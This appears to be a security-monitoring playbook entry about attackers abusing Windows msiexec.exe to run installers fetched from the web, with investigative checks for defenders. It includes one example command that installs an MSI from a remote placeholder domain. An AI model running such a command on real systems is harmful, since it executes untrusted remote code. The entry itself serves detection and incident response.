# Description
Msiexec is the command-line utility for the Windows Installer. Adversaries may abuse msiexec.exe to proxy execution of malicious payloads from remote locations.
# Attacker's Goals
Evading security controls and executing arbitrary files from the web.
# Investigative Actions
Monitor the command-line arguments of msiexec.exe, For example the command line - 'msiexec /i http://some_domain.com/www/executable.msi' can be legitimate or malicious. Validate the following criteria, if none of them are correct, follow incident response procedures:
Check execution of msiexec and the IP/Domain that used.
Is the URL that is encoded in the command line trusted.
Is executed DLL or MSI file known as legitimate.
Is the initiating process legitimate and the user running it knows of its use.
